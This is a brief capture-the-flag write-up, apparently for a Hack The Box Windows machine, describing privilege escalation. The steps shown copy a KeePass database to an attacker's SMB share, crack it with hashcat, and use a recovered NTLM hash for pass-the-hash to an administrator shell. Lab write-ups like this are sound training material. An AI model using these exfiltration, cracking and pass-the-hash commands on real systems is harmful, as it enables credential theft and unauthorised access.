# Getting Root


* Found Key Pass Data Base in :
![[Pasted image 20211114053714.png]]


Create a smb server on the local machine to receive the file CEH.kdbx

```bash
$ sudo impacket-smbserver giveitem `pwd`
```

On victim machine create a drive
```powershell
New-PSDrive -Name "JojoHere" -PSProvider "FileSystem" -Root "\\10.10.14.21\giveitem"
```
![[Pasted image 20211114064234.png]]

* Victim connecting on our drive
![[Pasted image 20211114064351.png]]


![[Pasted image 20211114064837.png]]

![[Pasted image 20211114064905.png]]

### Cracking CEH.kdbx
```bash
$ keepass2john CEH.kdbx 
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48

```

hashcat
```bash
hashcat -m 13400 jeeves.keepass /usr/share/wordlists/rockyou.txt 
```
Password: moonshine1
![[Pasted image 20211114065830.png]]

### Using KeePass2 to open database
![[Pasted image 20211114070447.png]]

Creds: administrator:S1TjAtJHKsugh9oC4VZl
![[Pasted image 20211114070612.png]]


NTLM HASH: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
![[Pasted image 20211114070818.png]]


### PassTheHash via pth-winexe to gain administrator shell
```bash
$ pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
```

Hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
![[Pasted image 20211114071601.png]]


* File inside of another file (Data Stream) (ntfs Attribute, can only read on windows)
![[Pasted image 20211114072504.png]]

Get content of data stream file
```powershell
powershell (Get-Content hm.txt -Stream root.txt)
```

